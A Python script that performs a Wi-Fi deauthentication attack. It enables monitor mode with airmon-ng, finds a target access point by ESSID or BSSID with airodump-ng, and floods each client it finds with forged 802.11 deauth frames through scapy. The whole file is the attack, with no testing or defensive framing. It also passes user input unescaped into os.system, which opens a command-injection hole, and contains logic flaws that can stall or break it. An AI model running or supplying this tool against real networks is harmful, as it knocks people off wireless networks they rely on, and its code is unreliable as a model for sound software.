import os
import time
import subprocess
from scapy.all import RadioTap, Dot11, Dot11Deauth, sendp


def enable_monitor_mode(interface):
    """Enable monitor mode on the specified interface."""
    os.system(f"airmon-ng start {interface}")


def disable_monitor_mode(interface):
    """Disable monitor mode on the specified interface."""
    os.system(f"airmon-ng stop {interface}")


def get_bssid_from_essid(essid, interface):
    """Find the BSSID of a network using its ESSID via airodump-ng."""
    print(f"Scanning for network ESSID: {essid}")
    try:
        # Run airodump-ng to capture Wi-Fi networks
        os.system(f"airodump-ng -w temp_scan --output-format csv {interface}mon 2>/dev/null")
        
        # Parse the CSV output to find the ESSID and corresponding BSSID
        with open("temp_scan-01.csv", "r") as f:
            for line in f.readlines():
                fields = line.split(",")
                if len(fields) > 13:  # Ensure the row has enough fields to check
                    bssid = fields[0].strip()
                    detected_essid = fields[13].strip()
                    if detected_essid == essid:
                        print(f"Found BSSID for ESSID '{essid}': {bssid}")
                        return bssid
        print(f"ESSID '{essid}' not found.")
        return None
    finally:
        if os.path.exists("temp_scan-01.csv"):
            os.remove("temp_scan-01.csv")

def deauth(target_mac, ap_mac, interface):
    """Send deauthentication packets."""
    # Construct the 802.11 deauthentication frame
    dot11 = Dot11(addr1=target_mac, addr2=ap_mac, addr3=ap_mac)
    deauth = Dot11Deauth(reason=7)  # Reason code 7: Class 3 frame received from nonassociated STA
    frame = RadioTap() / dot11 / deauth
    
    # Send the frame
    sendp(frame, iface=interface, count=100, inter=0.2, verbose=True)


def scan_and_deauth(ap_bssid, interface, exclusions):
    """Scan for clients connected to a specific AP and deauth them."""
    print(f"Scanning for clients on AP: {ap_bssid}...")
    try:
        while True:
            # Using airodump-ng to capture connected devices
            os.system(f"airodump-ng --bssid {ap_bssid} -w temp_clients --output-format csv {interface}")
            
            with open("temp_clients-01.csv", "r") as f:
                lines = f.readlines()
                # Read MAC addresses after the CSV headers (clients section)
                for line in lines:
                    fields = line.split(",")
                    if len(fields) > 0:
                        client_mac = fields[0].strip()
                        if client_mac and client_mac not in exclusions and len(client_mac) == 17:
                            print(f"Deauthenticating: {client_mac}")
                            deauth(client_mac, ap_bssid, interface)
    except KeyboardInterrupt:
        print("\nStopping scan and cleanup...")
    finally:
        if os.path.exists("temp_clients-01.csv"):
            os.remove("temp_clients-01.csv")


if __name__ == "__main__":
    interface = input("Enter your Wi-Fi interface (e.g., wlan0): ")
    target = input("Enter the AP's ESSID or BSSID to target: ")
    exclusions = input("Enter MAC addresses to exclude (comma-separated): ").split(",")
    exclusions = [mac.strip() for mac in exclusions]

    try:
        enable_monitor_mode(interface)
        interface_mon = f"{interface}mon"  # Default monitor mode naming convention

        # Check if the input is ESSID or BSSID
        if ":" in target:  # Likely a BSSID
            ap_bssid = target
        else:
            ap_bssid = get_bssid_from_essid(target, interface)
            if not ap_bssid:
                print("Failed to find BSSID. Exiting.")
                exit(1)

        scan_and_deauth(ap_bssid, interface_mon, exclusions)
    finally:
        disable_monitor_mode(interface_mon)
        print("Monitor mode disabled, exiting.")

